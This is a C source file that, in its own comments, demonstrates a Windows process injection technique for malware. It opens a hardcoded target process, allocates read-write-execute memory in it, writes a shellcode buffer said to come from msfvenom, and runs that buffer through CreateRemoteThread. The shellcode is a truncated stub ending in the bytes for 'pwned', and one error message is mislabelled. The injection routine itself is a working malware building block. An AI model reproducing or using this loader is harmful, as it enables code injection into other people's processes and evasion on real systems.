#include <Windows.h> /* Header file that acts as a wrapper for everything included in the Windows API */
#include <stdio.h> /* Header file for file I/O ops (e.g. print strings or R/W to console) */

/* Process injection technique for malware -- be sure to compile for the same
architecture for the process you're injecting into (x86/x64)! */

/* Process Injection Technique -- Very similar to self-injection
	1. Obtain a handle to the target process
	2. Allocate memory
	3. Write shellcode
	4. Execute shellcode */

int main(int argc, char** argv) {

	/* Created shellcode via MSFVenom on Kali Linux.
	Command: msfvenom -p windows/ ..... -f c -a x64 */
	unsigned char buf[] =
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
		"\x6c\x77\x61\x72\x65\x00\x70\x77\x6e\x65\x64\x00";
	
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 4567);
	LPVOID allocated_mem = VirtualAllocEx(hProcess, NULL, sizeof(buf), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (allocated_mem == NULL) {

		printf("Memory allocation failed: %ul\n", GetLastError());

		return 1;
	}
	/* Write shellcode into allocated memory */
	WriteProcessMemory(hProcess, allocated_mem, buf, sizeof(buf), NULL);

	/* Execute injected shellcode (buf) */
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocated_mem, NULL, 0, NULL);

	if (hThread == NULL) {

		printf("Failed to obtain process handle: %ul\n", GetLastError());

		return 1;

	}
	return 0;
}
